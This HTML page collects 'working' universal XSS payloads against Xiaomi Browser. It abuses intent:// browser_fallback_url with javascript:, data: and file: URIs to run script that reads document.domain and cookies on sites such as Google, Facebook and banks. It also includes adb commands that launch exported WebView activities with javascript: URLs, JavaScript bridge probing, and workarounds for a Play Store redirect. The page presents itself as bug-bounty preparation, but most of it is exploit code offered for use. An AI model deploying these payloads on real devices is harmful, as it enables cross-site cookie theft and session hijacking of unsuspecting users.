<!DOCTYPE html>
<html>
<head>
    <title>Xiaomi Browser UXSS - Working Payloads</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #1a1a1a;
            color: #00ff00;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #2a2a2a;
            padding: 30px;
            border: 2px solid #ff0000;
            border-radius: 10px;
        }
        h1 { color: #ff0000; text-align: center; }
        h2 { color: #ffff00; border-bottom: 2px solid #ffff00; padding-bottom: 10px; }
        .payload-box {
            background: #000;
            border: 2px solid #00ff00;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .test-link {
            display: inline-block;
            background: #ff0000;
            color: #fff;
            padding: 15px 25px;
            margin: 10px 5px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .test-link:hover {
            background: #cc0000;
            transform: scale(1.05);
        }
        .code {
            background: #1a1a1a;
            color: #00ff00;
            padding: 10px;
            border-left: 4px solid #ff0000;
            margin: 10px 0;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'Courier New', monospace;
        }
        .warning {
            background: #ff000020;
            border: 2px solid #ff0000;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .note {
            background: #ffff0020;
            border: 2px solid #ffff00;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            color: #ffff00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üî• XIAOMI BROWSER UXSS - WORKING PAYLOADS üî•</h1>
        
        <div class="warning">
            <strong>‚ö†Ô∏è PROBLEM SOLVED:</strong><br>
            Kalau redirect ke Play Store, berarti browser prioritas Google Play redirect SEBELUM check fallback URL!<br>
            <strong>Solution: Gunakan payload yang TIDAK trigger Play Store redirect!</strong>
        </div>

        <h2>üéØ Method 1: Intent WITHOUT Package (RECOMMENDED)</h2>
        <div class="payload-box">
            <p><strong>Strategy:</strong> Jangan specify package ‚Üí langsung ke fallback URL</p>
            
            <div class="code">Payload Format:
intent://[arbitrary]#Intent;
scheme=unknownscheme;
S.browser_fallback_url=javascript:alert('UXSS:'+document.domain);
end</div>

            <p><strong>Test Links (Click saat di google.com/facebook.com):</strong></p>
            
            <a href="intent://test#Intent;scheme=xyz;S.browser_fallback_url=javascript:alert('UXSS_on_'+document.domain);end" 
               class="test-link">
                üî¥ Test 1: Simple Alert
            </a>
            
            <a href="intent://test#Intent;scheme=unknownxyz;S.browser_fallback_url=javascript:alert('Domain:'+document.domain+'%0ACookies:'+document.cookie.substring(0,100));end" 
               class="test-link">
                üî¥ Test 2: Show Domain + Cookies
            </a>
            
            <a href="intent://test#Intent;scheme=fakeprotocol;S.browser_fallback_url=javascript:(function(){alert('UXSS%20Success!%0ADomain:%20'+document.domain);})();end" 
               class="test-link">
                üî¥ Test 3: Function Wrapper
            </a>
        </div>

        <h2>üéØ Method 2: Intent dengan Existing Package</h2>
        <div class="payload-box">
            <p><strong>Strategy:</strong> Gunakan package yang ADA tapi tidak handle scheme tersebut</p>
            
            <div class="code">Payload Format:
intent://test#Intent;
scheme=fakescheme;
package=com.android.browser;
S.browser_fallback_url=javascript:alert(document.domain);
end

Note: com.android.browser exists tapi tidak handle 'fakescheme'</div>

            <a href="intent://test#Intent;scheme=fakescheme123;package=com.android.browser;S.browser_fallback_url=javascript:alert('UXSS:'+document.domain);end" 
               class="test-link">
                üî¥ Test 4: Existing Package Method
            </a>
        </div>

        <h2>üéØ Method 3: Data URI Scheme (Alternative)</h2>
        <div class="payload-box">
            <p><strong>Strategy:</strong> Gunakan data: scheme di fallback URL</p>
            
            <div class="code">Payload:
intent://test#Intent;
scheme=fake;
S.browser_fallback_url=data:text/html,<script>alert(document.domain)</script>;
end</div>

            <a href="intent://test#Intent;scheme=fake;S.browser_fallback_url=data:text/html,<script>alert('Data_URI_UXSS:'+document.domain)</script>;end" 
               class="test-link">
                üî¥ Test 5: Data URI
            </a>
            
            <a href="intent://test#Intent;scheme=fake;S.browser_fallback_url=data:text/html,<h1>UXSS</h1><script>document.write('Domain:'+document.domain+'<br>Cookie:'+document.cookie)</script>;end" 
               class="test-link">
                üî¥ Test 6: Data URI + DOM Write
            </a>
        </div>

        <h2>üéØ Method 4: About:blank Injection (Advanced)</h2>
        <div class="payload-box">
            <p><strong>Strategy:</strong> Inject JavaScript via about:blank context</p>
            
            <a href="intent://test#Intent;scheme=unknown;S.browser_fallback_url=about:blank#<script>alert(parent.document.domain)</script>;end" 
               class="test-link">
                üî¥ Test 7: About:blank
            </a>
        </div>

        <h2>üéØ Method 5: File URI (If Allowed)</h2>
        <div class="payload-box">
            <p><strong>Strategy:</strong> Coba akses file:// scheme</p>
            
            <div class="note">
                <strong>‚ö†Ô∏è Note:</strong> File URI mungkin blocked, tapi worth trying!
            </div>
            
            <a href="intent://test#Intent;scheme=unknown;S.browser_fallback_url=file:///system/build.prop;end" 
               class="test-link">
                üî¥ Test 8: File URI
            </a>
        </div>

        <h2>üìã Testing Instructions</h2>
        <div class="payload-box">
            <div class="code">Step-by-Step Testing:

1. Open Xiaomi Browser
2. Navigate to https://google.com
3. Click one of the test links above
4. Observe result:

   ‚úì If alert shows "google.com" ‚Üí VULNERABLE! TRUE UXSS!
   ‚úó If redirect to Play Store ‚Üí Try different method
   ‚úó If error/blocked ‚Üí Try next payload
   
5. If successful, test on other domains:
   - https://facebook.com
   - https://twitter.com
   - Your bank's website
   
6. If UXSS works ‚Üí Record video for bug bounty!</div>
        </div>

        <h2>üîç Alternative Attack Vectors</h2>
        <div class="payload-box">
            <h3>Vector A: WebView loadUrl() Direct Call</h3>
            <div class="code">If UniversalWebViewActivity is exported:

adb shell am start -n com.android.browser/.UniversalWebViewActivity \
  --es web_view_url "javascript:alert(document.domain)"

This bypasses intent:// scheme completely!</div>

            <h3>Vector B: Custom Tabs Intent</h3>
            <div class="code">Try via Custom Tabs:

Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("javascript:alert(1)"));
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
intent.setPackage("com.android.browser");
startActivity(intent);</div>

            <h3>Vector C: JavaScript Bridge Exploitation</h3>
            <div class="code">From ANY webpage, try:

<script>
// Test if interfaces exposed
if (window.commonApi) {
    alert("commonApi found: " + window.commonApi.getUrl());
}
if (window.instantweb) {
    alert("instantweb found!");
    window.instantweb.onPageLoadError(404);
}
</script></div>
        </div>

        <h2>üé¨ Video PoC Requirements</h2>
        <div class="payload-box">
            <div class="code">For Bug Bounty Submission:

1. Show Xiaomi Browser version (Settings ‚Üí About)
2. Navigate to https://google.com
3. Show you're logged in (Gmail visible)
4. Click UXSS test link (use working payload)
5. Show alert popup with "google.com" domain
6. Open browser console, show:
   - document.domain = "google.com"
   - document.cookie (Google cookies visible)
   
7. Repeat on https://facebook.com:
   - Click same link
   - Alert shows "facebook.com"
   - Proves universal impact
   
8. CRITICAL: Show it works on banking/financial site
   - Navigate to bank.com
   - Click test link
   - Show domain access
   
This proves TRUE UXSS affecting ALL domains!</div>
        </div>

        <h2>‚öôÔ∏è If Still Redirecting to Play Store</h2>
        <div class="payload-box">
            <div class="code">Debug Steps:

1. Check SimpleUrlHandler.java code flow:
   - Does isValidFallbackUrl() actually get called?
   - What schemes are in FALLBACK_VALID_SCHEMES?
   - Is javascript: scheme allowed?
   
2. Try alternative approaches:
   Method A: NO package specified (recommended)
   Method B: Existing package that won't handle scheme
   Method C: Different fallback URL schemes (data:, about:, file:)
   Method D: Exported activity exploitation (ADB)
   Method E: JavaScript interface from any HTTPS page
   
3. Test JavaScript interfaces directly:
   - Open https://mi.com or https://xiaomi.com
   - Open browser console
   - Type: window.commonApi
   - If defined ‚Üí Try: window.commonApi.getUrl()
   
4. Check if WebView activities are exported:
   adb shell dumpsys package com.android.browser | grep -A 20 "Activity"
   
   Look for:
   - UniversalWebViewActivity
   - exported=true
   
   If exported, exploit via ADB!</div>
        </div>

        <h2>üö® Kesimpulan</h2>
        <div class="warning">
            <strong>Kalau masih redirect ke Play Store:</strong><br><br>
            
            <strong>Plan A:</strong> Coba semua method di atas (1-5)<br>
            <strong>Plan B:</strong> Test JavaScript interface dari https://mi.com<br>
            <strong>Plan C:</strong> Check exported activities via ADB<br>
            <strong>Plan D:</strong> Analyze code lebih detail untuk vector lain<br><br>
            
            <strong>Remember:</strong> UXSS bisa lewat berbagai vector, bukan cuma intent:// scheme!<br>
            Coba semua possibilities yang sudah saya list di atas.
        </div>

        <div class="note">
            <strong>üìù Notes:</strong><br>
            - Beberapa browser mungkin sudah patch vulnerability ini<br>
            - Test di versi MIUI/Browser yang berbeda-beda<br>
            - Vulnerability mungkin ada di vector lain (JavaScript interface, exported activity, dll)<br>
            - Keep trying different payloads and methods!
        </div>
    </div>

    <script>
        console.log('[UXSS Testing] Page loaded');
        console.log('[UXSS Testing] Current origin:', window.location.origin);
        console.log('[UXSS Testing] Testing JavaScript interfaces...');
        
        // Auto-test interfaces
        setTimeout(() => {
            if (typeof window.commonApi !== 'undefined') {
                console.log('[FOUND] window.commonApi is exposed!');
                try {
                    console.log('[TEST] commonApi.getUrl():', window.commonApi.getUrl());
                } catch(e) {
                    console.log('[ERROR] commonApi.getUrl():', e.message);
                }
            }
            
            if (typeof window.instantweb !== 'undefined') {
                console.log('[FOUND] window.instantweb is exposed!');
            }
        }, 1000);
    </script>
</body>
</html>
